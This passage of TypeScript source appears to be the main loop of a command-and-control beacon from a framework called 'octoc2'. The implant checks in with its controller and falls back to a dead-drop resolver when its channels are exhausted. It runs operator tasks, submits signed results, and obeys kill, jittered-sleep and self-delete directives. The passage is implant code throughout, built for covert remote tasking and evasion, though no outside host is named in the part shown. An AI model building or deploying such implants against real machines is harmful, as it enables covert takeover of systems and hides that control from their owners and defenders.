      const tasks = await factory.checkin(payload);

      if (
        tasks.length === 0 &&
        factory.isFullyExhausted() &&
        deadDropResolver
      ) {
        log.warn("All tentacles exhausted — polling deterministic recovery");
        lastRecoveryAttemptMs = Date.now();
        if (await pollRecovery("all tentacles exhausted")) {
          sleepSeconds = config.sleepSeconds;
          sleepJitter = config.jitter;
          await rebuildFactory(factory, config);
        }
      }

      if (tasks.length > 0) {
        log.info(`Received ${tasks.length} task(s).`);
      }

      // 3. Execute each task in order
      for (const task of tasks) {
        if (!running) break;

        log.info(`Executing task ${task.taskId} (${task.kind})`);

        const prior = config.state?.getTaskLedgerEntry(task.taskId);
        let directive: ExecutorDirective = { kind: "none" };
        let result: import("@octoc2/shared").TaskResult;

        if (prior?.status === "completed" && prior.result) {
          log.warn(`Task ${task.taskId} was already completed; resubmitting cached result`);
          result = prior.result;
          directive = prior.directive;
        } else if (prior?.status === "started") {
          log.error(
            `Task ${task.taskId} was started before a restart; refusing to execute it twice`,
          );
          result = await finalizeSignedResult(
            config,
            {
              taskId: task.taskId,
              beaconId: config.id,
              success: false,
              output: "Task execution outcome is unknown after restart; task was not re-executed.",
              completedAt: new Date().toISOString(),
              metadata: { replayPrevented: true },
            },
          );
        } else {
          if (!config.state?.beginTask(task.taskId)) {
            throw new Error(`Could not reserve task ${task.taskId} in the execution ledger`);
          }
          await config.state.persist();
          const execution = await executor.execute(task, config.id);
          directive = execution.directive;
          result = await finalizeSignedResult(
            config,
            execution.result,
            directive,
          );
        }

        // 4. Submit result
        const submission = await submitAndApplyDirective({
          submitter: factory,
          state: config.state!,
          result,
        });
        if (!submission.controllerAccepted) {
          log.error(
            submission.artifactWritten
              ? `Result artifact for task ${task.taskId} was written but not acknowledged by the controller`
              : `Failed to submit result for task ${task.taskId}`,
          );
          break;
        }

        // 5. Apply directives from the task
        if (submission.effect.kind === "kill") {
          log.warn("Kill directive — exiting.");
          running = false;
          break;
        }

        if (submission.effect.kind === "update_sleep") {
          sleepSeconds = submission.effect.seconds;
          sleepJitter  = submission.effect.jitter;
          log.info(`Sleep updated: ${sleepSeconds}s ±${Math.round(sleepJitter * 100)}%`);
        }
        if (submission.effect.kind === "self_delete") {
          if (
            applyLifecycleEffect(task.taskId, submission.effect) ||
            !submission.effect.success
          ) {
            break;
          }
        }
      }
      }
    } catch (err) {
      log.error(`Loop error: ${(err as Error).message}`);
    }

    // 6. Sleep before next checkin
    if (running) {
      const delay = jitteredSleepMs(sleepSeconds, sleepJitter);
      log.info(`Sleeping ${Math.round(delay / 1000)}s…`);
      await sleepMs(delay);
    }
  }

  // ── Teardown ──────────────────────────────────────────────────────────────
  log.info("Tearing down tentacles…");
  await factory.teardown();
  log.info("Shutdown complete.");
}

if (import.meta.main) {
  main().catch((err) => {
    // Use console.error here since the logger may not be initialized yet
    console.error(`[FATAL] [svc] ${(err as Error).message}`);
    process.exit(1);
  });
}
